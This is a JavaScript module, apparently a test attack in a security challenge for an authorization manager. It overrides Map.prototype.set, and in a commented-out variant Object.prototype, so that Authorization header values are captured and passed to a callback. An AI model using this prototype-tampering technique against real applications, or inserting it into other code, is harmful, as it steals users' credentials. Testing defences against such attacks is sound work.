const urlExample = "https://example.com";

export const attack = (authzManager, success) => {
  try {
    // You think the previous one was annoying?
    // No, this is annoying!
    
    const set = globalThis.Map.prototype.set;
    globalThis.Map.prototype.set = function (key, value) {
      if ((key+'').toLowerCase() === "authorization") {
        success(value);
      }
      return set.call(this, key, value);
    };


    // Older attack that worked up to a certain node version
    // Object.defineProperty(Object.prototype, "Authorization", {
    //   get: () => {},
    //   set: (v) => {
    //     success(v);
    //   },
    // });
    // This attack was most recently tested in Node.js v20.4.0

  } catch (e) {
    console.log(" ok, you win :( \n", e.message);
  }
  authzManager.authorizedFetch([
    {
      url: urlExample,
      headers: {},
    },
  ]);
};

if (typeof alert !== "undefined") {
  alert("This attack doesn't work in the browser, sorry!");
}
